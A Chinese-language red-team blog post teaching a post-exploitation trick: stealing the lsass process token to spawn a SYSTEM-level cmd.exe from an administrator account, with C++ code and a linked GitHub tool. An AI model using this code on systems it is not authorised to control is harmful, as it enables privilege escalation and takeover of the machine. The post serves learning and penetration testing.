---
layout:     post
title:    技巧-获得一个system权限的cmd
subtitle:   通过token复制启动system权限cmd
date:       2020-03-16
author:     hmoytx
header-img: img/bg_02.jpg
catalog: true
tags:
    - 技巧
    - 红队
    
    
---
# 技巧-获得一个system权限的cmd

## 简介
这里前提是已经获得了管理员权限。  
常用的方法是：  
- 创建服务
- token复制  

这里主要是想讲后者，且自己去实现这个过程。  


## 思路
先找到windows进程中以system权限启动的进程，这里以lsass为例子。  
首先需要获取到lsass的token，用到函数OpenProcessToken()。  
```
BOOL OpenProcessToken(
  HANDLE  ProcessHandle,
  DWORD   DesiredAccess,
  PHANDLE TokenHandle
);
```
主要是第二个参数，我们需要查询，访问，复制token，添加到别的进程，需要填入的参数是  
```
TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY | TOKEN_IMPERSONATE | TOKEN_DUPLICATE 
```  
具体的可以看官方文档。  
[https://docs.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken](https://docs.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken)  
[https://docs.microsoft.com/zh-tw/windows/win32/secauthz/access-rights-for-access-token-objects](https://docs.microsoft.com/zh-tw/windows/win32/secauthz/access-rights-for-access-token-objects)

然后通过DuplicateTokenEx函数复制创建一个新的主令牌。  
然后通过CreateProcessWithTokenW基于获得的token运行cmd。  
贴出部分代码：  
```
HANDLE GetProcessToken(DWORD Pid)
{
	HANDLE Pstoken = {};
	
	if (!OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, Pid)) {
		cout << "OpenProcess ERROR " << endl;
		return (HANDLE)NULL;
	}
	if (!OpenProcessToken(OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, Pid), TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &Pstoken)) {
		cout << "OpenProcessToken ERRO "<< endl;
		return (HANDLE)NULL;
	}
	return Pstoken;
}

void Run(HANDLE Token) {
	if (!DuplicateTokenEx(Token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &Token)) {
		cout << "DuplicateTokenEx ERROR " << endl;
	}
	STARTUPINFOW si = {};
	PROCESS_INFORMATION pi = {};
	BOOL ret;
	ret = CreateProcessWithTokenW(Token, LOGON_NETCREDENTIALS_ONLY, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
	if (!ret) {
		cout << "CreateProcessWithTokenW ERROR" << endl;
	}
}
```
具体代码放到github上。   
## 运行
编译出来运行，以管理员权限运行。  
![200316_1](/img/200316_cmd.png)  

## 拓展
具体的情景还可以修改启动的程序，修改复制的token，以不同的token去运行不同的程序，达到升降权的目的。  

## github
[https://github.com/hmoytx/ttttokencmd/](https://github.com/hmoytx/ttttokencmd/)  

## 参考
[https://422926799.github.io/posts/44f47c5e.html](https://422926799.github.io/posts/44f47c5e.html)  
[https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8EAdmin%E6%9D%83%E9%99%90%E5%88%87%E6%8D%A2%E5%88%B0System%E6%9D%83%E9%99%90/](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8EAdmin%E6%9D%83%E9%99%90%E5%88%87%E6%8D%A2%E5%88%B0System%E6%9D%83%E9%99%90/)  
